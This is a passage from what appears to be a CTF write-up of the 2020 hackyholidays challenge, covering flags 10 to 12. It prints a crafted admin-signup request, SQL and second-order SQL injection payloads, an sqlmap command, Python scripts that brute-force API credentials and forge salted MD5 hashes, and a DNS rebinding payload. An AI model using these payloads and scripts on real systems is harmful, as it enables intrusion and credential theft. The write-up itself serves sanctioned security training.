```
$ php -A
php > $x = "1e3"; echo is_numeric($x) . " " . strlen($x) . " " . intval($x) . " " . str_pad(intval($x), 3, "#");
1 3 1000 1000
```

This allows us to make the user entry 1 character longer than expected. The final `N` is cut off before adding this entry to `users.txt`, therefore an admin user can be created by adding `Y` as the very last character of the line which is the last character of a 15 character long `lastname` parameter.

The following request creates an admin user:

```
POST /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 94
Connection: close

action=signup&username=lumi&password=nougatzzz&age=1e3&firstname=lumi&lastname=AAAAAAAAAAAAAAY
```

When logging in with `lumi:nougatzzz`, admin.php gets included in the page which contains the flag, `flag{99309f0f-1752-44a5-af1e-a03e4150757d}`, as well as a link to the 11th challenge:

{F1138949}


## Flag 11 - Recon Server

Using the link from the 10th challenge, it is possible to access the recon server challenge under `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59`.

{F1138950}

What struck my attention first were the requests that load images, e.g.:

```
GET /r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzliODgxYWY4YjMyZmYwN2Y2ZGFhZGE5NWZmNzBkYzNhLmpwZyIsImF1dGgiOiJlOTM0ZjQ0MDdhOWRmOWZkMjcyY2RiOWMzOTdmNjczZiJ9 HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
```

When base64 decoding the `data` parameter, one can see that it contains a JSON object (as expected when looking at the first few characters of the base64 string):

```
{"image":"r3c0n_server_4fdk59\/uploads\/9b881af8b32ff07f6daada95ff70dc3a.jpg","auth":"e934f4407a9df9fd272cdb9c397f673f"}
```

I immediately thought of some sort of SSRF / local file inclusion but the content of the `image` parameter was protected by the `auth` value, which looks like a hash. When changing the `image` parameter to something else, the error message `invalid authentication hash` gets returned. After trying to crack the hash I came to the conclusion that it is possibly server-generated.

Next, I tried to find the API which was mentioned on the challenge site. It was pretty straightforward to find the API's base URL under `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api`:

{F1138951}

I thought that it was weird that so many different and very specific status codes were explained here. When trying to find endpoints under `/r3c0n_server_4fdk59/api/*`, I had no success at all, the only thing I got back from the server was the message `{"error":"This endpoint cannot be visited from this IP address"}`. 

Well, that sounds like SSRF again... After trying to play with the `Host` header and `X-Forwarded-For`,... without success, I again looked at the requests I got in Burp. Finally, I found out that SQL injection was possible in the `hash` parameter when loading an album:

After finding out that it is possible to use `union` and how many fields to add for getting the same number of columns than the original query, I finally even got output: When using `5' union all select '0',0,'albumtitle' -- -` as payload in the `hash` parameter, `albumtitle` was used as title of the album, and no entries were shown. However, when using an existing album ID as first field in the `union` query, e.g. `0'+union+all+select+'1',0,'albumtitle'+--+-`, the two image links from that category showed up.

It was time to get some more information about the database structure. Because the SQL injection could be performedd by using a single request, I used sqlmap for dumping the database schema as follows:

```
$ sqlmap -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k --dump
```

The following entries were found:

```
Database: recon
Table: photo
[6 entries]
+----+----------+--------------------------------------+
| id | album_id | photo                                |
+----+----------+--------------------------------------+
| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |
| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |
| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |
| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |
+----+----------+--------------------------------------+

Database: recon
Table: album
[3 entries]
+----+--------+-----------+
| id | hash   | name      |
+----+--------+-----------+
| 1  | 3dir42 | Xmas 2018 |
| 2  | 59grop | Xmas 2019 |
| 3  | jdh34k | Xmas 2020 |
+----+--------+-----------+
```

This only shows us data we already know and still does not help us accessing arbitrary API endpoints...

After some more thinking I had the idea to inject SQL into the SQL query and hope that the application is vulnerable to second-order sql injection. This worked indeed - I used the following proof-of concept payload for producing a single image link:

```
0' UNION ALL SELECT '0\' union all select 1,\'hash\',\'../api\' -- ',1,'albumtitle'-- -
```

JSON-decoding the image link's `data` parameter confirms that it is possible to inject into the URL:

```
{"image":"r3c0n_server_4fdk59\/uploads\/..\/api","auth":"38122d477657c1a0c9ba873c11017497"}
```

As the `auth` parameter is server-generated, it is valid, which can be confirmed by opening the image link:

```
GET /r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGkiLCJhdXRoIjoiMzgxMjJkNDc3NjU3YzFhMGM5YmE4NzNjMTEwMTc0OTcifQ== HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close


HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 31 Dec 2020 02:05:21 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 29

Invalid content type detected
```

This returns an error message about the content type (probably because an image is expected), but shows that the injection can possibly be used for querying the API. Great!

I wrote a Python script for finding API endpoints and found out that there seems a valid endpoint under `/r3c0n_server_4fdk59/api/user`. However when trying to access it, I got the error message `Invalid content type detected` again!

After being stuck for a bit, I found out that the endpoint accepts the `GET` parameters `username` and `password` as well. Not sure if they were totally vulnerable to SQLI again, but it was possible to query username and password character by character by using `%` as a wildcard, because whenever the query got results, the error message `Invalid content type detected` was returned.

The following script was used to find the API endpoints and retrieve valid credentials:

```
import re
import requests
import string

from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

BASE_URL = "https://hackyholidays.h1ctf.com"

# proxies = { "http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080" }
proxies = {}

def get_hash(s, payload):
    params = { "hash": f"0' UNION ALL SELECT '0\\' union all select 1,\\'hash\\',\\'{payload}\\' -- ',1,'albumtitle'-- -" }
    res = s.post(BASE_URL + "/r3c0n_server_4fdk59/album", params=params)
    m = re.search(".*<img class=\"img-responsive\" src=\"([^\"]+)\">.*", res.text, re.DOTALL)
    if m:
        return m.group(1)


def get_picture(s, url):
    res = s.get(BASE_URL + str(url))
    return res.text


def submit_try(s, payload):
    url = get_hash(s, payload)
    return get_picture(s, url)


def retrieve_username(s):
    result = ""
    alphabet = string.ascii_lowercase + string.digits
    resume = True
    while resume:
        for char in alphabet:
            if "Invalid content type detected" in submit_try(s, f"../api/user?username={result}{char}%"):
                result += char
                print(f"[+] Found: {result}")
                if "Invalid content type detected" in submit_try(s, f"../api/user?username={result}"):
                    resume = False
    return result


def retrieve_password(s, username):
    result = ""
    alphabet = string.ascii_letters + string.digits
    resume = True
    while resume:
        for char in alphabet:
            if "Invalid content type detected" in submit_try(s, f"../api/user?username={username}&password={result}{char}%"):
                result += char
                print(f"[+] Found: {result}")
                if "Invalid content type detected" in submit_try(s, f"../api/user?username={username}&password={result}"):
                    resume = False
    return result

def discover_endpoints(s, payload, normal_errormsg):
    content = []
    with open("/usr/share/seclists/Discovery/Web-Content/api/objects-lowercase.txt") as f:
        for line in f:
            fuzz = line.strip()
            url = get_hash(s, payload.format(fuzz=fuzz))
            res_text = get_picture(s, url)
            if normal_errormsg not in res_text:
                print(f"[+] {fuzz} -> {res_text}")
                content.append(fuzz)
            else:
                print(f"[-] {fuzz} -> {res_text}")
    return content


if __name__ == "__main__":
    s = requests.Session()
    s.proxies.update(proxies)
    s.verify = False

    routes = discover_endpoints(s, "../api/{fuzz}", "Expected HTTP status 200, Received: 404")
    print(f"FOUND: {routes}")

    params = discover_endpoints(s, "../api/user?{fuzz}=x", "Expected HTTP status 200, Received: 400")
    print(f"FOUND: {params}")

    username = retrieve_username(s)
    print(f"[+] Username: {username}")

    password = retrieve_password(s, username)
    print(f"[+] Password: {password}")

```

Finally, it was possible to login under [Attack Box](https://hackyholidays.h1ctf.com/attack-box/login) with the credentials `grinchadmin:s4nt4sucks` and get the flag, `flag{07a03135-9778-4dee-a83c-7ec330728e72}`:

{F1138952}


## Flag 12 - Attack Box

As shown above, a list of santa's key servers is listed on the attack-box, and attacks can be launched directly from there. When clicking on the `attack` button, a web terminal opens, showing that host information is gathered and a DDOS attack is launched. After the "attack", a ping is made to the host to see it if is still up.

Of course, we do not attack santa but the grinch himself, it is quite logical that we need to attack localhost in some way.

When clicking on `Attack` besides an IP address, a `GET` request is submitted to `https://hackyholidays.h1ctf.com/attack-box/launch` with a parameter `payload` and a value that looks like base64-encoded JSON once again.

Decoding such a payload gives the following result:

```
{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
```

Once again, the `target` parameter is protected by a hash, however, this time I could not find any possibility to make the server generate the hash for me. When trying to change the payload, the message `Invalid Protection Hash` is shown which confirms that the hash gets checked for sure, except when using any characters other than alphanumeric, dot and slash in the `target` value - in this case, the input validation fails immediately with `Invalid characters detected in the target`.

After finding the hint at https://twitter.com/Hacker0x01/status/1342545650789978112, I assumed that some salt is used to generate the hash. The length of the hash indicates that it is probably md5, hopefully the salt is either appended or prepended to the payload...

Using Hydra for cracking the salt succeeded and I found out that `mrgrinch463` is appended to the payload before calculating the MD5 hash of the payload. 

This allows generating valid hashes for arbitrary payloads and thus launch attacks against arbitrary targets - nice!

However, this turned out to the the easier step - I tried a bunch of payloads without success, e.g. possible contents of `/etc/hosts` that reference localhost and localhost IPs (`localhost`, `127.0.0.1`,`127.0.1.1`, `attackbox.local`, `attackbox`, `ip6-localhost`, `ip6-loopback`), different bypasses for making a ping to `localhost` without using `localhost` or `127.0.0.1` (`127.1`, `127.0.1`, `127.000.000.001`), IPv6 addresses (`::1`, `ipv6.localtest.me`), `hackyholidays.h1ctf.com`, the external IP / A record of `hackyholidays.h1ctf.com` (`18.216.153.32`), the AWS hostname found with [ipinfo](https://ipinfo.io/) (`ec2-18-216-153-32.us-east-2.compute.amazonaws.com"`), the internal 172 ip that was disclosed when pinging the AWS hostname from the attack box (`172.31.15.248`), broadcast addresses, my own VPS, Burp Collaborator hostnames,...

I used the following Python script for issuing manipulated requests:

```
import requests
import json
import base64
import hashlib
import re
import time
import string

from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

BASE_URL = "https://hackyholidays.h1ctf.com"

# proxies = { "http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080" }
proxies = {}

def generate_hash(host):
    data = "mrgrinch463" + ("Array" if type(host) != str else host)
    return hashlib.md5(data.encode()).hexdigest()

def submit_attack(s, host):
    data = {"target": host,"hash": generate_hash(host) }
    b64payload = base64.b64encode(json.dumps(data).encode()).decode()
    params = { "payload" : b64payload }
    res = s.get(BASE_URL + "/attack-box/launch", params=params)
    m = re.search(".*getJSON\('([^']+)'.*", res.text, re.DOTALL)
    print(m)
    if m:
        return m.group(1)
    else:
        print(res.status_code, res.text)

def get_json(s, url, query_id):
    print(f"URL: {BASE_URL}{url}".replace(".json", ""))
    res = s.get(BASE_URL + url + str(query_id))
    print(res.status_code, res.text)


if __name__ == "__main__":
    s = requests.Session()
    s.proxies.update(proxies)
    requests.utils.add_dict_to_cookiejar(s.cookies, {"attackbox": "d09d508e78f3975e0199a5e91dde9687"})
    s.verify = False

    host = "<PAYLOAD>"
    print(f"[+] Attacking {host}...")
    url = submit_attack(s, host)
    if url:
        get_json(s, url, "0")
```

I could observe that invalid IPs are either not accepted at all or, if they resolve to localhost, the attack gets blocked. IPv6 addresses do not work at all. All external IPs are blocked if they reference localhost or the external IP of the server. My own VPS was not hit by ping requests, probably I would have seen incoming DNS requests on my burp collaborator client but the identifiers were 1 character too long to work, therefore I just got `Internal Server Error` when trying to cause such requests.

After nearly giving up, I found out about DNS rebinding. It sounded promising, as there was basically no other option left except of resolving to a different hostname during the initial host checks and afterwards switching to localhost.

I used `http://1u.ms/`. After adjusting the payload to the 15 seconds delay, the payload `make-1.1.1.1-rebindfor15s-127.0.0.1-rr.1u.ms` worked and I finally got the last flag, `flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}`:

{F1138953}

## Impact

.

## Attachments
- flag1.png
- flag2_pagemoved.png
- flag2_jquery.png
- flag2_js_printflag.png
- flag3.png
- burp_endpoints.png
- flag4.png
- nofilestodownload.png
- downloadlink.png
- index_src.png
- flag6.png
- templates.png
- flag7.png
- adamtlangley_contribution.png
- commit.png
- hash_found.png
- flag8.png
- flag9.png
- flag10.png
- reconserver.png
- api.png
- flag11.png
- flag12.png
